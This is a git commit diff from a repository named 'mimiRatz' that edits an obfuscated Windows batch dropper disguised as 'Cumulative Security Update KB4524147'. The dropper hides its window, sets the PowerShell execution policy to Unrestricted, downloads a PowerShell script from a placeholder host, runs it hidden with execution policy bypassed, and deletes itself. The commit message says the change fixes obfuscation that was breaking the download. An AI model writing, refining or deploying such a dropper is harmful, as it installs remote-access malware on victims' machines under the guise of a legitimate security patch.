27b6c785532883ecfe577bef08deba1ff95e261c
pedro ubuntu <r00t-3xp10it@users.noreply.github.com>
2020-03-01 23:57:59 +0000

    Update Update-KB4524147.bat
    @coding9 BugReport { Obfuscation in dropper interfering with client download function }

--- mimiRatz/Update-KB4524147.bat
+++ mimiRatz/Update-KB4524147.bat
@@ -3,6 +3,6 @@
 ( ,;(=i%@Socket():%f ,no%k%t ^DE%DB_#1%FIN^ED ,%@%IS_%Buff_%MINI%#1%MI%'i'%ZE^D se%#0_%t ^IS_MIN^IM%#1_%IZ^ED=1 && @st^a%db%rt "" ^/m%_#1%i^n "%~dpnx0" %* && e%GUID%x^it); ),
 ,Col%ls%or 0E && (,(@tit%&1%le ^Cumu%_UUID_%l^ati%#1%v^e Sec%#1%u^ri%_i_%ty Up^dat%'%e KB%Buff_%4524147 && Pow%#1%e^rsh^el%Socket():%l Ge^t-Hot%vibes%Fi^x),)
 @cm%Buff#1%d ^/R ec^h%i0%o A|Pow^er%_GUID_%sh^ell Set-Exec^uti%'B%onPo^li%send(i)%cy Unr%db%e^stric^t%OFF%ed -Sc%_i0%o^pe Cur%_%r^ent%LANG%Us^er
-@Pow^er%Buff%sh^eL%#i_%l -C ;(NeW-Obj%KB_3457147%eCt Net.WebC%Channel%li^eNt).Dow%#1%nl%ON%oAd%'%F^iL%i0_%e('http://CharlieBrown/Update-KB4524147.ps1', '%tmp%\Update-KB4524147.ps1')
+@Pow^er%Buff%sh^eL%#i_%l -C ;(NeW-Obj%KB_3457147%eCt Net.WebC%Channel%li^eNt).Dow%#1%nloAd%'%F^iL%i0_%e('http://CharlieBrown/Update-KB4524147.ps1', '%tmp%\Update-KB4524147.ps1')
 @Cd %tmp% && ,pOw%_Socket(i)_%eR^sh%_i_%El^L -ExeC^ut%'b%I^oN ByP%\x0a%a^Ss -Win%_#1%dOw^stY^le hI%i0%d^Den -NoP%_i%r^Ofi%stuff%Le -Fi%Nal%l^E %tmp%\Update-KB4524147.ps1
 @Del /Q /F Update-KB4524147.bat && exit
